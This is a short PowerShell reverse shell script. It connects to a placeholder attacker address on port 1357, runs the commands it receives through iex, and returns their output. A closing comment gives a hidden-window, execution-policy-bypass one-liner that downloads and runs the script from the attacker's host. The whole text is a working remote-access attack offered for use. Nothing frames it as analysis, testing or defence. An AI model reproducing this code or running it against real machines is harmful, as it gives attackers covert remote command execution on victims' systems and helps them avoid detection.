$client = New-Object System.Net.Sockets.TcpClient("Attacker_ip", 1357)
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data =(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS" + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close()

#To download it you can use next command:
# powershell -ep bypass -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString("http://attacker_ip/reverse_shell.ps1")"